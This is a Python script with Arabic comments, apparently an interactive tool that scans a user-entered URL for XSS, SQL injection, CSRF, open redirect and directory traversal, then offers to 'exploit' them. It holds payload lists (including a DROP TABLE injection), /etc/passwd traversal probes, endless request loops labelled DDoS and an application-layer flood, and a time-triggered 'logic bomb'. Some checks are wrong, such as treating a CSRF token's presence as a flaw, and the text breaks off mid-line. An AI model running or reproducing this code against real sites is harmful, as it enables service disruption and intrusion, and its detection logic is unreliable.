import requests
import urllib.parse
import time

# مجموعة Payloads للفحص القوي
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "'><script>alert(1)</script>"
]

SQLI_PAYLOADS = [
    "' OR '1'='1", "\" OR \"1\"=\"1", "'--", "\"--", "'; DROP TABLE users;--", "' OR '1'='1' --"
]

# دالة لفحص XSS
def check_xss(url):
    try:
        parsed_url = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed_url.query)

        if not query:
            return False

        for param in query:
            for payload in XSS_PAYLOADS:
                new_query = query.copy()
                new_query[param] = payload
                new_query_string = urllib.parse.urlencode(new_query, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query_string}"
                res = requests.get(test_url)
                if payload in res.text:
                    return True
    except:
        pass
    return False

# دالة لفحص SQLi
def check_sqli(url):
    try:
        parsed_url = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed_url.query)

        if not query:
            return False

        for param in query:
            for payload in SQLI_PAYLOADS:
                new_query = query.copy()
                new_query[param] = payload
                new_query_string = urllib.parse.urlencode(new_query, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query_string}"
                res = requests.get(test_url)
                if any(error in res.text.lower() for error in ["sql", "syntax", "mysql", "error"]):
                    return True
    except:
        pass
    return False

# فحص CSRF
def check_csrf(url):
    try:
        res = requests.get(url)
        if "csrf" in res.text.lower() or "csrf_token" in res.text.lower():
            return True
    except:
        pass
    return False

# فحص Open Redirect
def check_open_redirect(url):
    try:
        payload = "http://malicious.com"
        test_url = url + "?redirect=" + payload
        res = requests.get(test_url)
        if payload in res.url:
            return True
    except:
        pass
    return False

# فحص Directory Traversal
def check_directory_traversal(url):
    try:
        payload = "../../../../etc/passwd"
        test_url = url + "/" + payload
        res = requests.get(test_url)
        if "root:" in res.text:
            return True
    except:
        pass
    return False

# دالة لتحليل رؤوس HTTP
def check_http_headers(url):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        res = requests.get(url, headers=headers)
        if 'X-Content-Type-Options' not in res.headers:
            return True
    except:
        pass
    return False

# استغلال XSS
def exploit_xss(url):
    payload = "<script>alert('Exploit XSS Successful!')</script>"
    try:
        res = requests.get(url + payload)
        if payload in res.text:
            print("[✔] XSS Exploited successfully!")
    except:
        pass

# استغلال SQLi
def exploit_sqli(url):
    payload = "' OR '1'='1' --"
    try:
        res = requests.get(url + payload)
        if "sql" in res.text.lower() or "error" in res.text.lower():
            print("[✔] SQL Injection Exploited successfully!")
    except:
        pass

# استغلال CSRF
def exploit_csrf(url):
    payload = "http://attacker.com/fake_request"
    try:
        res = requests.get(url + "?csrf_token=" + payload)
        if res.status_code == 200:
            print("[✔] CSRF Exploited successfully!")
    except:
        pass

# استغلال Open Redirect
def exploit_open_redirect(url):
    payload = "http://malicious.com"
    try:
        test_url = url + "?redirect=" + payload
        res = requests.get(test_url)
        if payload in res.url:
            print("[✔] Open Redirect Exploited successfully!")
    except:
        pass

# استغلال Directory Traversal
def exploit_directory_traversal(url):
    payload = "../../../../etc/passwd"
    try:
        test_url = url + "/" + payload
        res = requests.get(test_url)
        if "root:" in res.text:
            print("[✔] Directory Traversal Exploited successfully!")
    except:
        pass

# دالة لتنفيذ هجوم DDoS
def ddos_attack(url):
    try:
        while True:
            res = requests.get(url)
            print(f"[✔] DDoS Attack sent to {url}")
    except:
        pass

# دالة لتنفيذ هجوم DoS
def dos_attack(url):
    try:
        res = requests.get(url)
        print(f"[✔] DoS Attack sent to {url}")
    except:
        pass

# هجوم Hulke (Application Layer DDoS)
def hulke_attack(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        while True:
            payload = {
                "username": "admin",
                "password": "password",
                "login": "login"
            }
            res = requests.post(url, data=payload, headers=headers)
            print(f"[✔] Hulke Application Layer DDoS Attack sent to {url}")
    except:
        pass

# هجوم Logic Bomb (يتم تفعيل الهجوم فقط في وقت معين)
def logic_bomb(url):
    try:
        # على سبيل المثال، الهجوم يحدث في الساعة 3:00 مساءً
        current_time = time.localtime()
        if current_time.tm_hour == 15 and current_time.tm_min == 0:
            payload = "<script>alert('Logic Bomb Executed!')</script>"
            res = requests.get(url + payload)
            if payload in res.text:
                print("[✔] Logic Bomb Triggered and Executed!")
    except:
        pass

# دالة الفحص الرئيسية
def start_scan():
    url = input("Enter the URL for scanning: ")
    if not url:
        print("Please provide a valid URL!")
        return

    print("🔍 Starting a powerful scan...\n")

    # فحص الثغرات
    xss_result = check_xss(url)
    sqli_result = check_sqli(url)
    csrf_result = check_csrf(url)
    open_redirect_result = check_open_redirect(url)
    directory_traversal_result = check_directory_traversal(url)
    http_headers_result = check_http_headers(url)

    # تقرير عن الثغرات
    if xss_result:
        print("[✔] XSS vulnerability found!")
    else:
        print("[✘] No XSS found.")

    if sqli_result:
        print("[✔] SQL Injection vulnerability found!")
    else:
        print("[✘] No SQL Injection found.")
    
    if csrf_result:
        print("[✔] CSRF vulnerability found!")
    else:
        print("[✘] No CSRF found.")
    
    if open_redirect_result:
        print("[✔] Open Redirect vulnerability found!")
    else:
        print("[✘] No Open Redirect found.")

    if directory_traversal_result:
        print("[✔] Directory Traversal vulnerability found!")
    else:
        print("[✘] No Directory Traversal found.")

    if http_headers_result:
        print("[✔] Weak HTTP headers detected!")
    else:
        print("[✘] HTTP headers are fine.")

    # اختيار استغلال الثغرات
    if xss_result:
        exploit_choice = input("Do you want to exploit XSS? (yes/no): ").lower()
        if exploit_choice == 'yes':
            exploit_xss(url)

    if sqli_result:
        exploit_choice = input("Do you want to exploit SQL Injection? (yes/no): ").lower()
        if exploit_choice == 'yes':
            exploit_sqli(url)

    if csrf_result:
        exploit_choice = input("Do you want to exploit CSRF? (yes/no): ").lower()
        if exploit_choice == 'yes':
            exploit_csrf(url)

    if open_redirect_result:
        exploit_choice = input("Do you want to exploit Open Redirect? (yes/no): ").lower()
        if exploit_choice == 'yes':
            exploit_open_redirect(url)

    if directory_traversal_result:
        exploit_choice = input("
